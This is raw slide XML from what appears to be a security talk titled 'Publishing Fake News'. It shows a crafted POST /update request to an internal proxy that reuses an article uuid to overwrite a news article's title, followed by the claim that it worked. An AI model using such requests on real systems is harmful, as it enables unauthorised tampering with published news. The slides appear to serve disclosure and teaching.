                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>: on a news article:</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>view?uuid=cb5b5c90-143f-4c28-90d9-55c1fe0cff25</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>What if I tried specifying that in /update?</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="233" name="Google Shape;233;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="237" name="Shape 237"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="238" name="Google Shape;238;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="Google Shape;239;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="241" name="Google Shape;241;p34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="904400"/>
            <a:ext cx="8073300" cy="33363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t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST /update</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Host: xyzproxy.prod.k8s.cf.example.com</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"streams": "W10=",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"uuid": "cb5b5c90-143f-4c28-90d9-55c1fe0cff25",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"title": "Corben Leo",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"description": "This is a demo release",</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"tags": [],</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	"category": ""</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="246" name="Shape 246"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Google Shape;247;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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 name="Google Shape;248;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Google Shape;250;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="251" name="Google Shape;251;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="1402975"/>
            <a:ext cx="8073300" cy="585000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>It worked</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="252" name="Google Shape;252;p35"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="8500" r="22831" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="671225" y="2258200"/>
            <a:ext cx="6279074" cy="2205250"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="256" name="Shape 256"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="257" name="Google Shape;257;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;258;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="259" name="Google Shape;259;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Publishing Fake News</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Google Shape;260;p36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="261" name="Google Shape;261;p36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="1402975"/>
            <a:ext cx="8073300" cy="6003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b="1" lang="en" sz="2700">
                <a:solidFill>
